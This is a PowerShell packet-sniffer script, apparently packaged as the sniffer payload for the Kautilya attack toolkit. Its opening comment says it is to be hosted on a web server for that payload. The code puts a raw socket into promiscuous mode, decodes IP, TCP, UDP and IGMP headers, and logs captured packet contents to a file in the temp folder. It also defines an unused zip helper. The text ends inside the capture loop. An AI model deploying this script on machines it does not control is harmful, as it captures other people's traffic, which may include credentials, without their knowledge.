#This script needs to be uploaded to a web server to be used with Sniffer payload of Kautilya

# Script by Robbie Foust (rfoust@duke.edu)
    # This script will be changed to show more relevant packets
    
     
    param([string]$LocalIP = "NotSpecified", [string]$Protocol = "all", [int]$Seconds = 0, [switch]$ResolveHosts, [switch]$Statistics, [switch]$Silent)
     
    $starttime = get-date
    $byteIn = new-object byte[] 4
    $byteOut = new-object byte[] 4
    $byteData = new-object byte[] 4096  # size of data
     
    $byteIn[0] = 1  # this enables promiscuous mode (ReceiveAll)
    $byteIn[1-3] = 0
    $byteOut[0-3] = 0
     
    # TCP Control Bits
    $TCPFIN = [byte]0x01
    $TCPSYN = [byte]0x02
    $TCPRST = [byte]0x04
    $TCPPSH = [byte]0x08
    $TCPACK = [byte]0x10
    $TCPURG = [byte]0x20
    
    #largely based on a script at msdn
    function Zip($zipfilename,$filename)
        {
	
	    if(-not (test-path($zipfilename)))
	    {
		  set-content $zipfilename ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
		
	    }
	
	   $shellApplication = new-object -com shell.application
	   $zippackage = $shellApplication.NameSpace($zipfilename)
	   $zippackage.copyhere($filename)
       }
       
    # Takes a 2 byte array, switches it from big endian to little endian, and converts it to uint16.
    function NetworkToHostUInt16 ($value)
            {
            [Array]::Reverse($value)
            [BitConverter]::ToUInt16($value,0)
            }
     
    # Takes a 4 byte array, switches it from big endian to little endian, and converts it to uint32.
    function NetworkToHostUInt32 ($value)
            {
            [Array]::Reverse($value)
            [BitConverter]::ToUInt32($value,0)
            }
     
    # Takes a byte array, switches it from big endian to little endian, and converts it to a string.
    function ByteToString ($value)
            {
            $AsciiEncoding = new-object system.text.asciiencoding
            $AsciiEncoding.GetString($value)
            }
     
    $hostcache = @{}  # hashtable to cache hostnames to speed up ResolveIP()
     
    function ResolveIP ($ip)
            {
            if ($data = $hostcache."$($ip.IPAddressToString)")
                    {
                    if ($ip.IPAddressToString -eq $data)
                            {
                            [system.net.ipaddress]$ip
                            }
                    else
                            {
                            $data
                            }
                    }
            else
                    {
                    $null,$null,$null,$data = nslookup $ip.IPAddressToString 2>$null
     
                    $data = $data -match "Name:"
     
                    if ($data -match "Name:")
                            {
                            $data = $data[0] -replace "Name:\s+",""
                            $hostcache."$($ip.IPAddressToString)" = "$data"
                            $data
                            }
                    else
                            {
                            $hostcache."$($ip.IPAddressToString)" = "$($ip.IPAddressToString)"
                            $ip
                            }
                    }
            }
     
    # try to figure out which IP address to bind to by looking at the default route
    if ($LocalIP -eq "NotSpecified") {
            route print 0* | % {
                    if ($_ -match "\s{2,}0\.0\.0\.0") {
                            $null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
                            }
                    }
            }
     
    write-host "Using IPv4 Address: $LocalIP"
    write-host
     
     
    # open a socket -- Type should be Raw, and ProtocolType has to be IP for promiscuous mode, otherwise iocontrol will fail below.
    $socket = new-object system.net.sockets.socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
     
    # this tells the socket to include the IP header
    $socket.setsocketoption("IP","HeaderIncluded",$true)
     
    # make the buffer big or we'll drop packets.
    $socket.ReceiveBufferSize = 819200
     
    $ipendpoint = new-object system.net.ipendpoint([net.ipaddress]"$localIP",0)
    $socket.bind($ipendpoint)
     
    # this enables promiscuous mode
    [void]$socket.iocontrol([net.sockets.iocontrolcode]::ReceiveAll,$byteIn,$byteOut)
     
    write-host "Press ESC to stop the packet sniffer ..." -fore yellow
     
    $escKey = 27
    $running = $true
    $packets = @()  # this will hold all packets for later analysis
     
    while ($running)
            {
            # check and see if ESC was pressed
            if ($host.ui.RawUi.KeyAvailable)
                    {
                    $key = $host.ui.RawUI.ReadKey("NoEcho,IncludeKeyUp,IncludeKeyDown")
     
                    if ($key.VirtualKeyCode -eq $ESCkey)
                            {
                            $running = $false
                            }
                    }
           
            if ($Seconds -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Seconds)))  # if user-specified timeout has expired
                    {
                    exit
                    }
     
            if (-not $socket.Available)  # see if any packets are in the queue
                    {
                    start-sleep -milliseconds 500
                    continue
                    }
           
            # receive data
            $rcv = $socket.receive($byteData,0,$byteData.length,[net.sockets.socketflags]::None)
     
            # decode the header (see RFC 791 or this will make no sense)
            $MemoryStream = new-object System.IO.MemoryStream($byteData,0,$rcv)
            $BinaryReader = new-object System.IO.BinaryReader($MemoryStream)
     
            # First 8 bits of IP header contain version & header length
            $VersionAndHeaderLength = $BinaryReader.ReadByte()
     
            # Next 8 bits contain the TOS (type of service)
            $TypeOfService= $BinaryReader.ReadByte()
     
            # total length of header and payload
            $TotalLength = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
     
            $Identification = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
            $FlagsAndOffset = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
            $TTL = $BinaryReader.ReadByte()
            $ProtocolNumber = $BinaryReader.ReadByte()
            $Checksum = [Net.IPAddress]::NetworkToHostOrder($BinaryReader.ReadInt16())
     
            $SourceIPAddress = $BinaryReader.ReadUInt32()
            $SourceIPAddress = [System.Net.IPAddress]$SourceIPAddress
            $DestinationIPAddress = $BinaryReader.ReadUInt32()
            $DestinationIPAddress = [System.Net.IPAddress]$DestinationIPAddress
     
            # Get the IP version number from the "left side" of the Byte
            $ipVersion = [int]"0x$(('{0:X}' -f $VersionAndHeaderLength)[0])"
     
            # Get the header length by getting right 4 bits (usually will be 5, as in 5 32 bit words)
            # multiplying by 4 converts from words to octets which is what TotalLength is measured in
            $HeaderLength = [int]"0x$(('{0:X}' -f $VersionAndHeaderLength)[1])" * 4
     
            if ($HeaderLength -gt 20)  # if header includes Options (is gt 5 octets long)
                    {
                    [void]$BinaryReader.ReadBytes($HeaderLength - 20)  # should probably do something with this later
                    }
           
            $Data = ""
            $TCPFlagsString = @()  # make this an array
            $TCPWindow = ""
            $SequenceNumber = ""
           
            switch ($ProtocolNumber)  # see http://www.iana.org/assignments/protocol-numbers
                    {
                    1 {  # ICMP
                            $protocolDesc = "ICMP"
     
                            $sourcePort = [uint16]0
                            $destPort = [uint16]0
                            break
                            }
                    2 {  # IGMP
                            $protocolDesc = "IGMP"
                            $sourcePort = [uint16]0
                            $destPort = [uint16]0
                            $IGMPType = $BinaryReader.ReadByte()
                            $IGMPMaxRespTime = $BinaryReader.ReadByte()
                            $IGMPChecksum = [System.Net.IPAddress]::NetworkToHostOrder($BinaryReader.ReadInt16())
                            $Data = ByteToString $BinaryReader.ReadBytes($TotalLength - ($HeaderLength - 32))
                            }
                    6 {  # TCP
                            $protocolDesc = "TCP"
                           
                            $sourcePort = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
                            $destPort = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
                            $SequenceNumber = NetworkToHostUInt32 $BinaryReader.ReadBytes(4)
                            $AckNumber = NetworkToHostUInt32 $BinaryReader.ReadBytes(4)
                            $TCPHeaderLength = [int]"0x$(('{0:X}' -f $BinaryReader.ReadByte())[0])" * 4  # reads Data Offset + 4 bits of Reserve (ignored)
                           
                            $TCPFlags = $BinaryReader.ReadByte()  # this will also contain 2 bits of Reserve on the left, but we can just ignore them.
     
                            switch ($TCPFlags)
                                    {
                                    { $_ -band $TCPFIN } { $TCPFlagsString += "FIN" }
                                    { $_ -band $TCPSYN } { $TCPFlagsString += "SYN" }
                                    { $_ -band $TCPRST } { $TCPFlagsString += "RST" }
                                    { $_ -band $TCPPSH } { $TCPFlagsString += "PSH" }
                                    { $_ -band $TCPACK } { $TCPFlagsString += "ACK" }
                                    { $_ -band $TCPURG } { $TCPFlagsString += "URG" }
                                    }
                           
                            $TCPWindow = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
                            $TCPChecksum = [System.Net.IPAddress]::NetworkToHostOrder($BinaryReader.ReadInt16())
                            $TCPUrgentPointer = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
     
                            if ($TCPHeaderLength -gt 20)  # get to start of data
                                    {
                                    [void]$BinaryReader.ReadBytes($TCPHeaderLength - 20)
                                    }
     
                            # if SYN flag is set, sequence number is initial sequence number, and therefore the first
                            # octet of the data is ISN + 1.
                            if ($TCPFlags -band $TCPSYN)
                                    {
                                    $ISN = $SequenceNumber
                                    #$SequenceNumber = $BinaryReader.ReadBytes(1)
                                    [void]$BinaryReader.ReadBytes(1)
                                    }
     
                            $Data = ByteToString $BinaryReader.ReadBytes($TotalLength - ($HeaderLength + $TCPHeaderLength))
                            break
                            }
                    17 {  # UDP
                            $protocolDesc = "UDP"
     
                            $sourcePort = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
                            $destPort = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
                            $UDPLength = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
                            [void]$BinaryReader.ReadBytes(2)
                            # subtract udp header length (2 octets) and convert octets to bytes.
                            $Data = ByteToString $BinaryReader.ReadBytes(($UDPLength - 2) * 4)
                            break
                            }
                    default {
                            $protocolDesc = "Other ($_)"
                            $sourcePort = 0
                            $destPort = 0
                            break
                            }
                    }
           
            $BinaryReader.Close()
            $memorystream.Close()
     
            if ($ResolveHosts)  # resolve IP addresses to hostnames
                    {
                    # GetHostEntry is horribly slow on failed lookups, so I'm not using it
                    # $DestinationHostName = ([System.Net.DNS]::GetHostEntry($DestinationIPAddress.IPAddressToString)).Hostname
                    # $SourceHostName = ([System.Net.DNS]::GetHostEntry($SourceIPAddress.IPAddressToString)).Hostname
     
                    $DestinationHostName = ResolveIP($DestinationIPAddress)
                    $SourceHostName = ResolveIP($SourceIPAddress)
                    }
     
            # now throw the stuff we consider important into a psobject
            # $ipObject = new-object psobject
     
            if ($Protocol -eq "all" -or $Protocol -eq $protocolDesc)
                    {
                    $packet = new-object psobject
     
                    $packet | add-member noteproperty Destination $DestinationIPAddress
                    if ($ResolveHosts) { $packet | add-member noteproperty DestinationHostName $DestinationHostName }
                    $packet | add-member noteproperty Source $SourceIPAddress
                    if ($ResolveHosts) { $packet | add-member noteproperty SourceHostName $SourceHostName }
                    $packet | add-member noteproperty Version $ipVersion
                    $packet | add-member noteproperty Protocol $protocolDesc
                    $packet | add-member noteproperty Sequence $SequenceNumber
                    $packet | add-member noteproperty Window $TCPWindow
                    $packet | add-member noteproperty DestPort $destPort
                    $packet | add-member noteproperty SourcePort $sourcePort
                    $packet | add-member noteproperty Flags $TCPFlagsString
                    $packet | add-member noteproperty Data $Data
                    $packet | add-member noteproperty Time (get-date)
     
                    $packets += $packet  # add this packet to the array
                    $file = "$env:temp/packets.txt"
                    if (-not $Silent)
                            {
                            #$packet
                            Out-File -FilePath $file -Append -InputObject $packet
                                                      
                            }
                    }


